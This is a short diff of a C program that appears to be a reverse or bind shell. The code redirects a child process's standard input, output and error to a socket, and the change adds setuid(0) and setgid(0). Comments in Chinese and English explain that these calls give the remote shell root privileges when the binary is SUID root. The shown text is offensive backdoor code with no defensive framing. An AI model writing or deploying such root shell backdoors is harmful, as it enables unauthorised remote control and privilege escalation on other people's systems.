@@ -43,7 +43,10 @@ int main(int argc, char *argv[]) {
 
             if (pid == 0) {
                 // --- 子进程 (Child Process) ---
-                
+                // 关键点：显式设置 UID/GID 为 0 (Root)
+                // 只有当文件具有 SUID root 权限时，这两行才会生效
+                setuid(0); 
+                setgid(0);
                 // 使用 dup2 将标准输入(0)、标准输出(1)、标准错误(2) 重定向到套接字 s
                 // Redirect stdin, stdout, and stderr to the socket
                 dup2(s, 0);
@@ -75,4 +78,5 @@ int main(int argc, char *argv[]) {
     }
 
     return 0;
+
 }
